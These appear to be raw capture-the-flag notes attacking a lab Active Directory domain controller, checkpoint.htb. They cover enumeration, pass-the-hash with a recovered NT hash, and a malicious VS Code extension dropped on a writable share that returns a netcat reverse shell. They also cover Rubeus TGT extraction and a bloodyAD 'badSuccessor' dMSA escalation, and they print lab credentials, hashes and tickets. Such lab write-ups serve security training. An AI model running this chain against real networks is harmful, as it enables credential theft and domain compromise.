# Checkpoint

creds: alex.turner / Checkpoint2024!

sudo nmap -sCV 10.129.16.146
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-19 11:37 EDT
Nmap scan report for 10.129.16.146
Host is up (0.013s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-19 22:37:48Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-06-19T22:38:00
|_  start_date: N/A
|_clock-skew: 6h59m57s

cme smb 10.129.16.146 -u 'alex.turner' -p 'Checkpoint2024!' --shares --users
SMB         10.129.16.146   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.16.146   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
SMB         10.129.16.146   445    DC01             [*] Enumerated shares
SMB         10.129.16.146   445    DC01             Share           Permissions     Remark
SMB         10.129.16.146   445    DC01             -----           -----------     ------
SMB         10.129.16.146   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.16.146   445    DC01             C$                              Default share
SMB         10.129.16.146   445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.16.146   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.16.146   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.16.146   445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.16.146   445    DC01             VMBackups

SMB         10.129.16.146   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-

SMB         10.129.16.146   445    DC01             Administrator                 2026-05-09 16:16:34 0       Built-in account for administering the computer/domain
SMB         10.129.16.146   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.16.146   445    DC01             krbtgt                        2026-05-09 08:41:01 0       Key Distribution Center Service Account
SMB         10.129.16.146   445    DC01             alex.turner                   2026-05-09 09:00:08 0

SMB         10.129.16.146   445    DC01             ryan.brooks                   2026-05-10 13:46:18 0

SMB         10.129.16.146   445    DC01             svc_deploy                    2026-05-09 09:01:19 0       Deployment service account
SMB         10.129.16.146   445    DC01             james.harper                  2026-05-09 09:02:53 0

SMB         10.129.16.146   445    DC01             sarah.mitchell                2026-05-09 09:02:58 0

SMB         10.129.16.146   445    DC01             emily.carter                  2026-05-09 09:03:05 0

SMB         10.129.16.146   445    DC01             david.reynolds                2026-05-09 09:03:11 0

SMB         10.129.16.146   445    DC01             jessica.coleman               2026-05-09 09:03:15 0

SMB         10.129.16.146   445    DC01             lauren.flores                 2026-05-09 09:03:21 0

SMB         10.129.16.146   445    DC01             michael.torres                2026-05-09 09:03:28 0

SMB         10.129.16.146   445    DC01             kevin.patterson               2026-05-09 09:03:33 0

SMB         10.129.16.146   445    DC01             brian.jenkins                 2026-05-09 09:03:37 0

SMB         10.129.16.146   445    DC01             megan.perry                   2026-05-09 09:03:42 0

SMB         10.129.16.146   445    DC01             max.palmer                    2026-05-26 01:25:15 0

SMB         10.129.16.146   445    DC01             [*] Enumerated 17 local users: CHECKPOINT

cat /etc/hosts
127.0.0.1	localhost

The following lines are desirable for IPv6 capable hosts

::1	localhost	ip6-localhost	ip6-loopback
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
127.0.1.1	pwnbox7.1
127.0.1.1	[htb-nh1ze5t8os.htb-cloud.com](http://htb-nh1ze5t8os.htb-cloud.com/)	htb-nh1ze5t8os

127.0.0.1 localhost
127.0.1.1 htb-nh1ze5t8os [htb-nh1ze5t8os.htb-cloud.com](http://htb-nh1ze5t8os.htb-cloud.com/)
10.129.16.146 checkpoint.htb

sudo nmap -sU --top-ports 50 10.129.16.146
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-19 11:39 EDT
Nmap scan report for 10.129.16.146
Host is up (0.074s latency).
Not shown: 48 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp

enum4linux -A 10.129.16.146 -u alex.turner -p 'Checkpoint2024!'
ENUM4LINUX - next generation (v1.3.10)

# ==========================
| Target Information |

[*] Target ........... 10.129.16.146
[*] Username ......... 'alex.turner'
[*] Random Username .. 'cskrtaop'
[*] Password ......... 'Checkpoint2024!'
[*] Timeout .......... 10 second(s)

# ======================================
| Listener Scan on 10.129.16.146 |

[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

# =====================================================
| Domain Information via LDAP for 10.129.16.146 |

[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: checkpoint.htb

# ============================================================
| NetBIOS Names and Workgroup/Domain for 10.129.16.146 |

[-] Could not get NetBIOS names information via 'nmblookup': timed out

# ==========================================
| SMB Dialect Check on 10.129.16.146 |

[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
SMB 1.0: false
SMB 2.0.2: true
SMB 2.1: true
SMB 3.0: true
SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

# ============================================================
| Domain Information via SMB session for 10.129.16.146 |

[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: CHECKPOINT
DNS domain: checkpoint.htb
FQDN: DC01.checkpoint.htb
Derived membership: domain member
Derived domain: CHECKPOINT

# ==========================================
| RPC Session Check on 10.129.16.146 |

[*] Check for anonymous access (null session)
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for password authentication
[+] Server allows authentication via username 'alex.turner' and password 'Checkpoint2024!'
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE

# ====================================================
| Domain Information via RPC for 10.129.16.146 |

[+] Domain: CHECKPOINT
[+] Domain SID: S-1-5-21-3129162710-3498938529-1807524340
[+] Membership: domain member

# ================================================
| OS Information via RPC for 10.129.16.146 |

[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '26100'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x80102b'
Server type string: Wk Sv PDC Tim NT

# ======================================
| Users via RPC on 10.129.16.146 |

[*] Enumerating users via 'querydispinfo'
[+] Found 17 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 17 user(s) via 'enumdomusers'
[+] After merging user results we have 17 user(s) total:
'1101':
username: alex.turner
name: (null)
acb: '0x00000210'
description: (null)
'1103':
username: ryan.brooks
name: (null)
acb: '0x00000210'
description: (null)
'1104':
username: svc_deploy
name: (null)
acb: '0x00000210'
description: Deployment service account
'1111':
username: james.harper
name: (null)
acb: '0x00000210'
description: (null)
'1112':
username: sarah.mitchell
name: (null)
acb: '0x00000210'
description: (null)
'1113':
username: emily.carter
name: (null)
acb: '0x00000210'
description: (null)
'1114':
username: david.reynolds
name: (null)
acb: '0x00000210'
description: (null)
'1115':
username: jessica.coleman
name: (null)
acb: '0x00000210'
description: (null)
'1116':
username: lauren.flores
name: (null)
acb: '0x00000210'
description: (null)
'1117':
username: michael.torres
name: (null)
acb: '0x00000210'
description: (null)
'1118':
username: kevin.patterson
name: (null)
acb: '0x00000210'
description: (null)
'1119':
username: brian.jenkins
name: (null)
acb: '0x00000210'
description: (null)
'1120':
username: megan.perry
name: (null)
acb: '0x00000210'
description: (null)
'500':
username: Administrator
name: (null)
acb: '0x00000210'
description: Built-in account for administering the computer/domain
'501':
username: Guest
name: (null)
acb: '0x00000215'
description: Built-in account for guest access to the computer/domain
'502':
username: krbtgt
name: (null)
acb: '0x00000011'
description: Key Distribution Center Service Account
'5101':
username: max.palmer
name: (null)
acb: '0x00000210'
description: (null)

# =======================================
| Groups via RPC on 10.129.16.146 |

[*] Enumerating local groups
[+] Found 5 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 29 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 24 group(s) via 'enumdomgroups'
[+] After merging groups results we have 58 group(s) total:
'1105':
groupname: IT-Staff
type: domain
'1106':
groupname: Finance-Staff
type: domain
'1107':
groupname: HR-Staff
type: domain
'1108':
groupname: Engineering-Staff
type: domain
'1109':
groupname: VPN-Users
type: domain
'1110':
groupname: DevTeam
type: domain
'1121':
groupname: DnsAdmins
type: local
'1122':
groupname: DnsUpdateProxy
type: domain
'1123':
groupname: BackupAccess
type: domain
'498':
groupname: Enterprise Read-only Domain Controllers
type: domain
'512':
groupname: Domain Admins
type: domain
'513':
groupname: Domain Users
type: domain
'514':
groupname: Domain Guests
type: domain
'515':
groupname: Domain Computers
type: domain
'516':
groupname: Domain Controllers
type: domain
'517':
groupname: Cert Publishers
type: local
'518':
groupname: Schema Admins
type: domain
'519':
groupname: Enterprise Admins
type: domain
'520':
groupname: Group Policy Creator Owners
type: domain
'521':
groupname: Read-only Domain Controllers
type: domain
'522':
groupname: Cloneable Domain Controllers
type: domain
'525':
groupname: Protected Users
type: domain
'526':
groupname: Key Admins
type: domain
'527':
groupname: Enterprise Key Admins
type: domain
'528':
groupname: Forest Trust Accounts
type: domain
'529':
groupname: External Trust Accounts
type: domain
'544':
groupname: Administrators
type: builtin
'545':
groupname: Users
type: builtin
'546':
groupname: Guests
type: builtin
'548':
groupname: Account Operators
type: builtin
'549':
groupname: Server Operators
type: builtin
'550':
groupname: Print Operators
type: builtin
'551':
groupname: Backup Operators
type: builtin
'552':
groupname: Replicator
type: builtin
'553':
groupname: RAS and IAS Servers
type: local
'554':
groupname: Pre-Windows 2000 Compatible Access
type: builtin
'555':
groupname: Remote Desktop Users
type: builtin
'556':
groupname: Network Configuration Operators
type: builtin
'557':
groupname: Incoming Forest Trust Builders
type: builtin
'558':
groupname: Performance Monitor Users
type: builtin
'559':
groupname: Performance Log Users
type: builtin
'560':
groupname: Windows Authorization Access Group
type: builtin
'561':
groupname: Terminal Server License Servers
type: builtin
'562':
groupname: Distributed COM Users
type: builtin
'568':
groupname: IIS_IUSRS
type: builtin
'569':
groupname: Cryptographic Operators
type: builtin
'571':
groupname: Allowed RODC Password Replication Group
type: local
'572':
groupname: Denied RODC Password Replication Group
type: local
'573':
groupname: Event Log Readers
type: builtin
'574':
groupname: Certificate Service DCOM Access
type: builtin
'575':
groupname: RDS Remote Access Servers
type: builtin
'576':
groupname: RDS Endpoint Servers
type: builtin
'577':
groupname: RDS Management Servers
type: builtin
'578':
groupname: Hyper-V Administrators
type: builtin
'579':
groupname: Access Control Assistance Operators
type: builtin
'580':
groupname: Remote Management Users
type: builtin
'582':
groupname: Storage Replica Administrators
type: builtin
'585':
groupname: OpenSSH Users
type: builtin

# =======================================
| Shares via RPC on 10.129.16.146 |

[*] Enumerating shares
[+] Found 7 share(s):
ADMIN$:
comment: Remote Admin
type: Disk
C$:
comment: Default share
type: Disk
DevDrop:
comment: VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
type: Disk
IPC$:
comment: Remote IPC
type: IPC
NETLOGON:
comment: Logon server share
type: Disk
SYSVOL:
comment: Logon server share
type: Disk
VMBackups:
comment: ''
type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share DevDrop
[+] Mapping: OK, Listing: OK
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
[*] Testing share VMBackups
[+] Mapping: OK, Listing: DENIED

# ==========================================
| Policies via RPC for 10.129.16.146 |

[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
Password history length: 24
Minimum password length: 7
Minimum password age: 1 day 4 minutes
Maximum password age: 41 days 23 hours 53 minutes
Password properties:

- DOMAIN_PASSWORD_COMPLEX: true
- DOMAIN_PASSWORD_NO_ANON_CHANGE: false
- DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
- DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
- DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
- DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
Lockout observation window: 10 minutes
Lockout duration: 10 minutes
Lockout threshold: None
Domain logoff information:
Force logoff time: not set

# ==========================================
| Printers via RPC for 10.129.16.146 |

[+] No printers available

No useful shares

no NP users

No Asrep roast users

can’t get bloodhound info

alex.turner is in IT-Staff group

bloodyAD -u alex.turner -d checkpoint.htb -p 'Checkpoint2024!' --host 10.129.16.146 get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
name: Deleted Objects

distinguishedName: DC=..Deleted-_msdcs.checkpoint.htb\0ADEL:60285362-a2b5-4a2f-8d7e-3e8426d65f77,CN=Deleted Objects,DC=checkpoint,DC=htb
name: ..Deleted-_msdcs.checkpoint.htb
DEL:60285362-a2b5-4a2f-8d7e-3e8426d65f77

distinguishedName: DC=@\0ADEL:b30fd01b-460c-47bf-9b9e-f65ccd1b887b,CN=Deleted Objects,DC=checkpoint,DC=htb
name: @
DEL:b30fd01b-460c-47bf-9b9e-f65ccd1b887b

distinguishedName: DC=..Deleted-checkpoint.htb\0ADEL:02c5b4f3-8837-4142-8369-6e22a90d3c95,CN=Deleted Objects,DC=checkpoint,DC=htb
name: ..Deleted-checkpoint.htb
DEL:02c5b4f3-8837-4142-8369-6e22a90d3c95

distinguishedName: DC=@\0ADEL:ec1030e6-d9e6-40aa-86fe-3ee92e730f41,CN=Deleted Objects,DC=checkpoint,DC=htb
name: @
DEL:ec1030e6-d9e6-40aa-86fe-3ee92e730f41

distinguishedName: DC=_msdcs\0ADEL:505df182-0c1d-418b-b5f4-01c4187e3b12,CN=Deleted Objects,DC=checkpoint,DC=htb
name: _msdcs
DEL:505df182-0c1d-418b-b5f4-01c4187e3b12

distinguishedName: DC=win-picg7a7jvmg\0ADEL:7a23d7ee-392e-4dcd-9d08-5c13db10a4e5,CN=Deleted Objects,DC=checkpoint,DC=htb
name: win-picg7a7jvmg
DEL:7a23d7ee-392e-4dcd-9d08-5c13db10a4e5

distinguishedName: DC=DomainDnsZones\0ADEL:cbfaf7d6-97ba-450a-83c1-29349a3ac0fd,CN=Deleted Objects,DC=checkpoint,DC=htb
name: DomainDnsZones
DEL:cbfaf7d6-97ba-450a-83c1-29349a3ac0fd

distinguishedName: DC=_ldap._tcp.DomainDnsZones\0ADEL:6e1a44a6-960e-4ccc-b615-9ce8389212d9,CN=Deleted Objects,DC=checkpoint,DC=htb
name: _ldap._tcp.DomainDnsZones
DEL:6e1a44a6-960e-4ccc-b615-9ce8389212d9

distinguishedName: DC=_ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones\0ADEL:ebf7fb87-cebb-4fee-906b-4ff3646991a9,CN=Deleted Objects,DC=checkpoint,DC=htb
name: _ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones
DEL:ebf7fb87-cebb-4fee-906b-4ff3646991a9

distinguishedName: DC=ForestDnsZones\0ADEL:8921fc77-b395-43af-9a85-72b32c770000,CN=Deleted Objects,DC=checkpoint,DC=htb
name: ForestDnsZones
DEL:8921fc77-b395-43af-9a85-72b32c770000

distinguishedName: DC=_ldap._tcp.ForestDnsZones\0ADEL:97731c29-4c6d-436a-8678-881cef61af79,CN=Deleted Objects,DC=checkpoint,DC=htb
name: _ldap._tcp.ForestDnsZones
DEL:97731c29-4c6d-436a-8678-881cef61af79

distinguishedName: DC=_ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones\0ADEL:c4340ac6-59c7-4f00-827b-933403b066f5,CN=Deleted Objects,DC=checkpoint,DC=htb
name: _ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones
DEL:c4340ac6-59c7-4f00-827b-933403b066f5

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
name: Mark Davies
DEL:2217e877-e2a2-47d7-91d4-99ede36f367e

distinguishedName: CN=pwnsucc\0ADEL:666554bb-6f8d-4e35-acc6-658883aa22ed,CN=Deleted Objects,DC=checkpoint,DC=htb
name: pwnsucc
DEL:666554bb-6f8d-4e35-acc6-658883aa22ed

Have to restore mark.davies account in AD and recover his NT Hash

cme smb 10.129.16.146 -H 0b28e49d9deb96f99d74578e214faec2 -u mark.davies --shares
SMB         10.129.16.146   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.16.146   445    DC01             [+] checkpoint.htb\mark.davies:0b28e49d9deb96f99d74578e214faec2
SMB         10.129.16.146   445    DC01             [*] Enumerated shares
SMB         10.129.16.146   445    DC01             Share           Permissions     Remark
SMB         10.129.16.146   445    DC01             -----           -----------     ------
SMB         10.129.16.146   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.16.146   445    DC01             C$                              Default share
SMB         10.129.16.146   445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.16.146   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.16.146   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.16.146   445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.16.146   445    DC01             VMBackups

smbclient -U checkpoint.htb/mark.davies --password=0b28e49d9deb96f99d74578e214faec2 --pw-nt-hash \\\\10.129.16.146\\DevDrop
Try "help" to get a list of possible commands.
smb: \> put evil.vsix
putting file evil.vsix as \evil.vsix (47.8 kb/s) (average 47.8 kb/s)
smb: \> exit

nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.16.146 53791

PS C:\Program Files\Microsoft VS Code>
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code> hostname
DC01

nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.16.146 53791

PS C:\Program Files\Microsoft VS Code>
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code> hostname
DC01

PS C:\Users\ryan.brooks\Desktop> cat user.txt
81d17779412c559594d322b86f6ad03e

PS C:\temp> .\Rubeus.exe tgtdeleg /nowrap

---

(_____ \      | |

***) )   | |  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/***)
| |  \ \| |*| | |*) ) ***| || |*** |
|*|   |*|**/|**/|_____)_***/(***/

v2.2.0

[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: G5mclX7BJNf24Znu6r+Y4mZaJe943/3S7M4kQZYLcZs=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

```
  doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuHNX/hJWkUI5RpRuVfX2z+k1GDtyYEysbjIO3pUEh6WySJ9yMNaLVmfcDh8GvU0sPlTs8F7FanyoA7HdFw3kGoI58uxtyeL3H7W6e8wKOnprCmPaQ8oUIoCoZUsZCOpq5R3466EtJaTsgLWxETTXcanye+WsDYo41pZViulESJsPgVz+49CK3BYZibY9pzjNysOsFpnk2mMsUAgoqWUCxJ65QuSvE4tHjO78f4WW3RQg3hmU7/DgDM5gt3z4Qos5n56dAkr2lWTOMgQjquqdxmquiJa/cCjJSarJnpgPc74qg2nYnGFxcDg/2ToQv1tzSQWzz81TplvsWX1cnX7Ms/F5g1v9Hof8QEydMS//0AnLNTmruE1DFbejjEjedDn2EhBkE/kxMuC3T7QC76OLDYERYSw96DUl5vHtjA9bQ3Pkdk6RAlopcyFKWk9Q+1ekyKK15ayX36vUtSDCgWznw9aGw/Y8on+PIXIIEfLHIgMJORfyzLq7zbWxNW34FQnfWpF9xwd0nXLh9C8yaNLzQeGCw8EsGCkV97mIDYrEMBwaaYkhzPi6dcU98IgyIR5PknupU1EwUit0mMBTHDgLlvbGqWqCXTlfRzZ5fOSku5QQtltvGPkZyf75gk54bf2aT/N8VEJTqZ283FRSMLfPpbYojNODDHB7LwggCo6t4bSSir7SaSq94q1S08MjDT/NPsbYDYwcE802oQO2bERSJAHfDTMpfzW9xQYT6HBDwYP6V4dzzk7QemF4QdnM3Y4W6tkvTh28pOg7zfaXxANnI0aoObovmRDh/Fp0tgOt4TiaLokIz/I4EI5kzdmDLx6YavVDjpeifDjluBU00Iy1EsKh6GcUWiXAdKU5/4+ww17b0KRTdQlVk7ObROrJZNyiH6tK/V5BXtNWWZuW73iz6mTD880eEMWluxvqjpA+UxTmXDw6SBdekiS+j+aavdnOWzjyG620rZQAHKgtW5i8Wd0B5i86UNUZnQ12apkkn9qnuIZFbQUxPzIaqHR5/qasVI0u5Tpot9APZlcDsupLUYwlrug7Knwu6hXdtE1669BgOcRFufu50jVzIasvaAsHzHAIkqNik4G2X7FKUhEI8xMr1J/uJw6cCATsU97UDr7KjuzZgcGrQehra0WmRPtwRNo7Eobia3WTOeuZ5Ss03415aehwPDQFGljpVi4+ckFRdkrwbbUxG9pjj8/bAn7qkeXA0CRmlJLxuUZJ/axtlKHt0SFIaBgDHe8xlhz6CNUtvAfZzRflNxbu9SWL26HbT03UfiaLSG6CZjM6fEFrFCuNJtkns19KI/lyvKQStxohGewbeIFQPVHsiJgi5SwsNi+8mOQTsIE5mZy+TbXYCpcjEngmoFCkDfWbacUDmGxINGe4MatlP3PoSzBpjfR45NGZhoLKlryO9cyxECzE8QkWApd90JRuZL08HyCE83aump5MXYGgSx7MSP/tSfDrOm0Zn08Xlj9hM90UmtcyrUp8WZXsiYKQqS57ufCDAo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg50JpDOGJiDEF2CIjGdLrx38DTw8o1WncbnkvRLE6HWChEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYyMDAyMzQ0MVqmERgPMjAyNjA2MjAxMjM0NDFapxEYDzIwMjYwNjI3MDIzNDQxWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
```

echo "doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuHNX/hJWkUI5RpRuVfX2z+k1GDtyYEysbjIO3pUEh6WySJ9yMNaLVmfcDh8GvU0sPlTs8F7FanyoA7HdFw3kGoI58uxtyeL3H7W6e8wKOnprCmPaQ8oUIoCoZUsZCOpq5R3466EtJaTsgLWxETTXcanye+WsDYo41pZViulESJsPgVz+49CK3BYZibY9pzjNysOsFpnk2mMsUAgoqWUCxJ65QuSvE4tHjO78f4WW3RQg3hmU7/DgDM5gt3z4Qos5n56dAkr2lWTOMgQjquqdxmquiJa/cCjJSarJnpgPc74qg2nYnGFxcDg/2ToQv1tzSQWzz81TplvsWX1cnX7Ms/F5g1v9Hof8QEydMS//0AnLNTmruE1DFbejjEjedDn2EhBkE/kxMuC3T7QC76OLDYERYSw96DUl5vHtjA9bQ3Pkdk6RAlopcyFKWk9Q+1ekyKK15ayX36vUtSDCgWznw9aGw/Y8on+PIXIIEfLHIgMJORfyzLq7zbWxNW34FQnfWpF9xwd0nXLh9C8yaNLzQeGCw8EsGCkV97mIDYrEMBwaaYkhzPi6dcU98IgyIR5PknupU1EwUit0mMBTHDgLlvbGqWqCXTlfRzZ5fOSku5QQtltvGPkZyf75gk54bf2aT/N8VEJTqZ283FRSMLfPpbYojNODDHB7LwggCo6t4bSSir7SaSq94q1S08MjDT/NPsbYDYwcE802oQO2bERSJAHfDTMpfzW9xQYT6HBDwYP6V4dzzk7QemF4QdnM3Y4W6tkvTh28pOg7zfaXxANnI0aoObovmRDh/Fp0tgOt4TiaLokIz/I4EI5kzdmDLx6YavVDjpeifDjluBU00Iy1EsKh6GcUWiXAdKU5/4+ww17b0KRTdQlVk7ObROrJZNyiH6tK/V5BXtNWWZuW73iz6mTD880eEMWluxvqjpA+UxTmXDw6SBdekiS+j+aavdnOWzjyG620rZQAHKgtW5i8Wd0B5i86UNUZnQ12apkkn9qnuIZFbQUxPzIaqHR5/qasVI0u5Tpot9APZlcDsupLUYwlrug7Knwu6hXdtE1669BgOcRFufu50jVzIasvaAsHzHAIkqNik4G2X7FKUhEI8xMr1J/uJw6cCATsU97UDr7KjuzZgcGrQehra0WmRPtwRNo7Eobia3WTOeuZ5Ss03415aehwPDQFGljpVi4+ckFRdkrwbbUxG9pjj8/bAn7qkeXA0CRmlJLxuUZJ/axtlKHt0SFIaBgDHe8xlhz6CNUtvAfZzRflNxbu9SWL26HbT03UfiaLSG6CZjM6fEFrFCuNJtkns19KI/lyvKQStxohGewbeIFQPVHsiJgi5SwsNi+8mOQTsIE5mZy+TbXYCpcjEngmoFCkDfWbacUDmGxINGe4MatlP3PoSzBpjfR45NGZhoLKlryO9cyxECzE8QkWApd90JRuZL08HyCE83aump5MXYGgSx7MSP/tSfDrOm0Zn08Xlj9hM90UmtcyrUp8WZXsiYKQqS57ufCDAo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg50JpDOGJiDEF2CIjGdLrx38DTw8o1WncbnkvRLE6HWChEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYyMDAyMzQ0MVqmERgPMjAyNjA2MjAxMjM0NDFapxEYDzIwMjYwNjI3MDIzNDQxWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=" | base64 -d > ryan.tgt

impacket-ticketConverter /home/ronking37/ryan.tgt ryan.converted
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done

dedivip-4]─[10.10.15.206]─[ronking37@htb-nh1ze5t8os]─[~]
└──╼ [★]$ export KRB5CCNAME=/home/ronking37/ryan.converted
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-nh1ze5t8os]─[~]
└──╼ [★]$ klist
Ticket cache: FILE:/home/ronking37/ryan.converted
Default principal: ryan.brooks@CHECKPOINT.HTB

Valid starting       Expires              Service principal
06/19/2026 22:34:41  06/20/2026 08:34:41  krbtgt/CHECKPOINT.HTB@CHECKPOINT.HTB
renew until 06/26/2026 22:34:41

bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k add badSuccessor svcpwn --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb'
[+] Creating DMSA svcpwn$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : svcpwn$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-20 02:39:16+00:00
EndTime      : 2026-06-20 12:34:41+00:00
RenewTill    : 2026-06-27 02:34:41+00:00
Flags        : enc-pa-rep, pre-authent, forwardable, renewable, forwarded
Keytype      : 18
Key          : aXuq6VdssTfCeVC/OT4h18nQfgi4f73VNvXc14cth4I=

[+] dMSA TGT stored in ccache file svcpwn_Dh.ccache

dMSA current keys found in TGS:
AES256: a7ef5882f01052bbf0f2819e98b86faf2e54e9fcd5fea88f830ba491d4e7f909
